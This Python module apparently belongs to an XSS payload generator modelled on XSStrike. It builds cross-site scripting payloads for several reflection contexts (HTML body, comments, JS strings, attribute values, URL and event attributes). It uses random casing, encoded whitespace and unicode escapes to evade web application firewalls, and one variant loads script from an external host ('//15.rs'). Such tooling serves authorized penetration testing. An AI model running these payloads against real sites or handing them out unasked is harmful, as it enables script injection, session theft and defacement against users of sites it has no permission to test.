"""Context-aware, combinatorial XSS payload generator.

Implements two core techniques from XSStrike's generator/utils:

1. ``random_upper(s)`` — randomises the casing of a string on every call.
   Applied to HTML tag names and event handler names so each generated payload
   has a unique case pattern, bypassing WAFs that match fixed-case strings.

2. ``gen_gen(breaker, surviving_chars)`` — Cartesian-product payload engine.
   Iterates tags × event_handlers × js_functions × space_replacements and
   yields one payload string per combination.  Only yields combinations whose
   required characters all appear in *surviving_chars*.

3. Context-specific generators:
   - ``html_body_payloads`` — uses gen_gen for html / html_comment contexts.
   - ``js_string_payloads`` — uses jsContexter to build a dynamic closer then
     generates a payload per JS function.
   - ``js_code_payloads`` — similar to js_string but no quote to close.
   - ``html_attr_value_payloads`` — quote-breakout + event handler variants.
   - ``html_attr_url_payloads`` — javascript: URI + srcdoc/external-src variants.
   - ``html_attr_event_payloads`` — direct function injection.

All generators return ``list[PayloadCandidate]`` sorted by descending
``risk_score`` (confidence tier), highest first.
"""
from __future__ import annotations

import random
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from ai_xss_generator.types import PayloadCandidate


# ---------------------------------------------------------------------------
# randomUpper — per-call non-deterministic casing
# ---------------------------------------------------------------------------

def random_upper(s: str) -> str:
    """Return *s* with each character randomly uppercased or lowercased."""
    return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)


# ---------------------------------------------------------------------------
# Tag / handler / function inventories
# ---------------------------------------------------------------------------

# Tags that support common event handlers without requiring special attributes.
# Ordered roughly by WAF-bypass effectiveness (unusual tags first).
_TAGS = ["details", "d3v", "svg", "img", "body", "html", "a"]

# Tags that require a specific attribute to make the event fire automatically.
_TAGS_WITH_ATTR: dict[str, str] = {
    "details": "open",   # ontoggle fires when details is toggled open
    "img":     "src=x",  # onerror fires on broken src
}

# Event handlers ordered by likelihood of firing without user interaction.
_EVENT_HANDLERS = [
    "ontoggle",        # <details open ontoggle=...>
    "onload",          # <svg onload=...>, <body onload=...>
    "onerror",         # <img src=x onerror=...>
    "onpointerenter",  # fires on pointer device hover (touch too on some browsers)
    "onmouseover",     # fires on mouse hover
    "onfocus",         # fires on focus (combine with autofocus)
    "onclick",         # requires click but widely supported
]

# Tag × handler compatibility (handler only makes sense for these tags).
# If not in map, the handler is assumed compatible with all tags.
_HANDLER_TAGS: dict[str, set[str]] = {
    "ontoggle":       {"details"},
    "onload":         {"svg", "body", "html", "iframe"},
    "onerror":        {"img", "video", "audio", "input"},
    "onpointerenter": {"details", "d3v", "svg", "body", "html", "a"},
    "onmouseover":    {"details", "d3v", "svg", "body", "html", "a"},
    "onfocus":        {"details", "d3v", "svg", "a"},
    "onclick":        {"details", "d3v", "svg", "body", "html", "a"},
}

# JS expressions to embed in the payload.  Using several forms of the same
# call covers function-name and parenthesis filters.
_JS_FUNCTIONS = [
    "alert(document.domain)",
    "confirm(document.domain)",
    "alert`${document.domain}`",
    "(alert)(document.domain)",
    "confirm`1`",
    r"co\u006efirm(1)",       # unicode-escape bypass on 'n'
]

# Replacements for the space between the tag name and the event handler.
# Some WAFs strip literal spaces; tab / newline / slash often survive.
_SPACE_SUBS = [" ", "%09", "%0a", "%0d", "/", "/+/"]

# Characters that terminate the tag (after the handler value).
_ENDS = ["//", ">"]


# ---------------------------------------------------------------------------
# gen_gen — the combinatorial payload engine
# ---------------------------------------------------------------------------

def gen_gen(
    breaker: str,
    surviving_chars: frozenset[str],
) -> list["PayloadCandidate"]:
    """Generate all tag×handler×function×space combinations for html_body.

    *breaker* is prepended to every payload (e.g. ``"`` for breaking out of
    a quoted attribute, or ``-->`` for comment breakout).  Pass ``""`` for
    plain HTML body context.

    Only yields payloads whose structurally-required characters all survive:
    - ``<`` and ``>`` must survive for any tag injection.
    - The specific space-sub character must survive (for literal ones like %09
      we check the encoded form wouldn't be re-encoded by the server — we just
      include it optimistically since we can't know without firing).

    Returns candidates sorted by risk_score descending.
    """
    from ai_xss_generator.types import PayloadCandidate

    # Minimum requirement: angle brackets must survive
    if "<" not in surviving_chars:
        return []

    candidates: list[PayloadCandidate] = []
    seen: set[str] = set()

    needs_gt = ">" in surviving_chars

    for tag in _TAGS:
        tag_attr = _TAGS_WITH_ATTR.get(tag, "")

        for handler in _EVENT_HANDLERS:
            # Skip incompatible tag/handler combos
            allowed = _HANDLER_TAGS.get(handler)
            if allowed is not None and tag not in allowed:
                continue

            for fn in _JS_FUNCTIONS:
                for space in _SPACE_SUBS:
                    for end in _ENDS:
                        if end == ">" and not needs_gt:
                            end = "//"

                        # Build payload with randomised casing on tag + handler
                        r_tag = random_upper(tag)
                        r_handler = random_upper(handler)

                        if tag_attr:
                            payload = (
                                f"{breaker}<{r_tag} {tag_attr}{space}"
                                f"{r_handler}={fn}{end}"
                            )
                        else:
                            payload = (
                                f"{breaker}<{r_tag}{space}"
                                f"{r_handler}={fn}{end}"
                            )

                        if payload in seen:
                            continue
                        seen.add(payload)

                        # Confidence tier: no-interaction handlers score higher
                        if handler in ("ontoggle", "onload", "onerror", "onpointerenter"):
                            tier = 10
                        elif handler in ("onmouseover", "onfocus"):
                            tier = 8
                        else:
                            tier = 6

                        candidates.append(PayloadCandidate(
                            payload=payload,
                            title=f"gen:{r_tag}/{r_handler}",
                            explanation=(
                                f"Combinatorial payload: <{tag} {handler}={fn}> "
                                f"space={space!r} end={end!r}"
                            ),
                            test_vector="",   # filled in by caller
                            tags=["gen_gen", tag, handler],
                            target_sink="probe:html_body",
                            risk_score=tier * 10,
                        ))

    # Sort: highest confidence first; shuffle within same tier for casing variety
    candidates.sort(key=lambda c: -c.risk_score)
    return candidates


# ---------------------------------------------------------------------------
# Context-specific generators
# ---------------------------------------------------------------------------

def html_body_payloads(
    surviving_chars: frozenset[str],
    param_name: str,
) -> list["PayloadCandidate"]:
    """Payloads for html_body and html_comment reflections."""
    from urllib.parse import quote as url_quote
    from ai_xss_generator.types import PayloadCandidate

    breaker = ""
    candidates = gen_gen(breaker, surviving_chars)

    # Annotate test_vector
    for c in candidates:
        c.test_vector = f"?{param_name}={url_quote(c.payload, safe='')}"

    return candidates


def html_comment_payloads(
    surviving_chars: frozenset[str],
    param_name: str,
) -> list["PayloadCandidate"]:
    """Payloads for html_comment reflections — break out with --> first."""
    from urllib.parse import quote as url_quote
    from ai_xss_generator.types import PayloadCandidate

    # Need - to close the comment
    if "-" not in surviving_chars and "<" not in surviving_chars:
        return []

    candidates: list[PayloadCandidate] = []
    seen: set[str] = set()

    if "-" in surviving_chars:
        breaker = "-->"
        for c in gen_gen(breaker, surviving_chars):
            if c.payload not in seen:
                seen.add(c.payload)
                c.target_sink = "probe:html_comment"
                c.test_vector = f"?{param_name}={url_quote(c.payload, safe='')}"
                candidates.append(c)

    # If < survives but not -, we can still inject inside the comment body
    if "<" in surviving_chars:
        for c in gen_gen("", surviving_chars):
            if c.payload not in seen:
                seen.add(c.payload)
                c.risk_score = max(c.risk_score - 20, 10)  # lower confidence
                c.target_sink = "probe:html_comment"
                c.test_vector = f"?{param_name}={url_quote(c.payload, safe='')}"
                candidates.append(c)

    candidates.sort(key=lambda c: -c.risk_score)
    return candidates


def js_string_payloads(
    surviving_chars: frozenset[str],
    param_name: str,
    quote_char: str,
    context_before: str,
    context_type: str,
) -> list["PayloadCandidate"]:
    """Payloads for js_string_dq / js_string_sq / js_string_bt reflections.

    Uses jsContexter to build a dynamic closer from *context_before*, then
    prepends it to each JS function variant.
    """
    from urllib.parse import quote as url_quote
    from ai_xss_generator.types import PayloadCandidate
    from ai_xss_generator.active.js_contexter import build_js_closer

    if quote_char not in surviving_chars and ";" not in surviving_chars:
        return []

    closer = build_js_closer(context_before, quote_char) if context_before else f"{quote_char};"

    candidates: list[PayloadCandidate] = []
    for fn in _JS_FUNCTIONS:
        payload = f"{closer}{fn}//"
        candidates.append(PayloadCandidate(
            payload=payload,
            title=f"js-string breakout [{quote_char}] → {fn}",
            explanation=(
                f"JS string ({quote_char}) breakout using dynamic closer {closer!r}. "
                f"Surviving chars: {''.join(sorted(surviving_chars))!r}."
            ),
            test_vector=f"?{param_name}={url_quote(payload, safe='')}",
            tags=["js_string", context_type, f"quote:{quote_char}"],
            target_sink=f"probe:{context_type}",
            risk_score=96,
        ))

    # Backtick template literal fallback (if ` survives for js_string_bt)
    if context_type == "js_string_bt" and "`" in surviving_chars:
        for fn in _JS_FUNCTIONS:
            payload = f"`${{{fn}}}`"
            candidates.append(PayloadCandidate(
                payload=payload,
                title=f"backtick template expression → {fn}",
                explanation="Template literal injection.",
                test_vector=f"?{param_name}={url_quote(payload, safe='')}",
                tags=["js_string", "js_string_bt", "template_literal"],
                target_sink="probe:js_string_bt",
                risk_score=88,
            ))

    return candidates


def js_code_payloads(
    surviving_chars: frozenset[str],
    param_name: str,
    context_before: str,
) -> list["PayloadCandidate"]:
    """Payloads for js_code reflections (bare code, no surrounding quote)."""
    from urllib.parse import quote as url_quote
    from ai_xss_generator.types import PayloadCandidate
    from ai_xss_generator.active.js_contexter import build_js_closer

    closer = build_js_closer(context_before, quote_char="") if context_before else ""

    candidates: list[PayloadCandidate] = []
    for fn in _JS_FUNCTIONS:
        payload = f"{closer}{fn}//"
        candidates.append(PayloadCandidate(
            payload=payload,
            title=f"js_code injection → {fn}",
            explanation=(
                f"Direct JS code injection with closer {closer!r}. "
                f"Surviving: {''.join(sorted(surviving_chars))!r}."
            ),
            test_vector=f"?{param_name}={url_quote(payload, safe='')}",
            tags=["js_code"],
            target_sink="probe:js_code",
            risk_score=97,
        ))

    return candidates


def html_attr_value_payloads(
    surviving_chars: frozenset[str],
    param_name: str,
    attr_name: str,
) -> list["PayloadCandidate"]:
    """Payloads for html_attr_value reflections — quote break-out variants."""
    from urllib.parse import quote as url_quote
    from ai_xss_generator.types import PayloadCandidate

    candidates: list[PayloadCandidate] = []

    for q in ('"', "'"):
        if q not in surviving_chars:
            continue
        r_handler = random_upper("onmouseover")
        candidates.append(PayloadCandidate(
            payload=f"{q} {r_handler}={random.choice(_JS_FUNCTIONS)}{q}",
            title=f"attr escape ({q}) → {r_handler}",
            explanation=f"Break out of {q}-quoted attribute into event handler.",
            test_vector="",
            tags=["html_attr_value", f"attr:{attr_name}"],
            target_sink="probe:html_attr_value",
            risk_score=94,
        ))
        r_handler2 = random_upper("onfocus")
        candidates.append(PayloadCandidate(
            payload=f'{q} {r_handler2}="{random.choice(_JS_FUNCTIONS)}" autofocus="',
            title=f"attr escape ({q}) → autofocus + {r_handler2}",
            explanation="Break out with autofocus for no-interaction trigger.",
            test_vector="",
            tags=["html_attr_value", "autofocus", f"attr:{attr_name}"],
            target_sink="probe:html_attr_value",
            risk_score=92,
        ))

    # Both quotes filtered but > survives — try full tag break-out
    if ">" in surviving_chars and "<" in surviving_chars:
        for c in gen_gen("", surviving_chars):
            c.risk_score = min(c.risk_score, 80)  # lower tier since we're in an attr
            c.target_sink = "probe:html_attr_value"
            candidates.append(c)

    for c in candidates:
        if not c.test_vector:
            c.test_vector = f"?{param_name}={url_quote(c.payload, safe='')}"

    candidates.sort(key=lambda c: -c.risk_score)
    return candidates


def html_attr_url_payloads(
    surviving_chars: frozenset[str],
    param_name: str,
    attr_name: str,
) -> list["PayloadCandidate"]:
    """Payloads for html_attr_url reflections (href, src, action, srcdoc, etc.)."""
    from urllib.parse import quote as url_quote
    from ai_xss_generator.types import PayloadCandidate

    candidates: list[PayloadCandidate] = []

    if attr_name == "srcdoc":
        # srcdoc accepts HTML entity-encoded markup — use %26lt; for <
        for fn in _JS_FUNCTIONS:
            payload = f"%26lt;img src=x onerror={fn}%26gt;"
            candidates.append(PayloadCandidate(
                payload=payload,
                title=f"srcdoc HTML entity injection → {fn}",
                explanation="srcdoc accepts %26lt; as < — inject entity-encoded tag.",
                test_vector=f"?{param_name}={url_quote(payload, safe='')}",
                tags=["html_attr_url", "srcdoc"],
                target_sink="probe:html_attr_url",
                risk_score=90,
            ))
    else:
        # javascript: URI works for href, action, formaction, data
        for fn in _JS_FUNCTIONS:
            payload = f"javascript:{fn}"
            candidates.append(PayloadCandidate(
                payload=payload,
                title=f"javascript: URI → {fn}",
                explanation=f"javascript: URI injection into {attr_name} attribute.",
                test_vector=f"?{param_name}={url_quote(payload, safe='')}",
                tags=["html_attr_url", f"attr:{attr_name}"],
                target_sink="probe:html_attr_url",
                risk_score=96,
            ))
        # For src of <script>/<iframe>/<embed> — external URL load
        if attr_name in ("src", "data"):
            for fn in _JS_FUNCTIONS:
                payload = "//15.rs"  # well-known XSS callback shortener placeholder
                candidates.append(PayloadCandidate(
                    payload=payload,
                    title="external src load",
                    explanation=f"Load external JS via {attr_name} attribute.",
                    test_vector=f"?{param_name}={url_quote(payload, safe='')}",
                    tags=["html_attr_url", "external_src", f"attr:{attr_name}"],
                    target_sink="probe:html_attr_url",
                    risk_score=85,
                ))
                break  # one external-src entry is enough

    candidates.sort(key=lambda c: -c.risk_score)
    return candidates


def html_attr_event_payloads(
    surviving_chars: frozenset[str],
    param_name: str,
    attr_name: str,
) -> list["PayloadCandidate"]:
    """Payloads for html_attr_event reflections — already inside an on* handler."""
    from urllib.parse import quote as url_quote
    from ai_xss_generator.types import PayloadCandidate

    candidates: list[PayloadCandidate] = []
    for fn in _JS_FUNCTIONS:
        candidates.append(PayloadCandidate(
            payload=fn,
            title=f"event handler direct injection → {fn}",
            explanation=f"Injection directly inside {attr_name} handler — no breakout needed.",
            test_vector=f"?{param_name}={url_quote(fn, safe='')}",
            tags=["html_attr_event", f"attr:{attr_name}"],
            target_sink="probe:html_attr_event",
            risk_score=99,
        ))

    return candidates
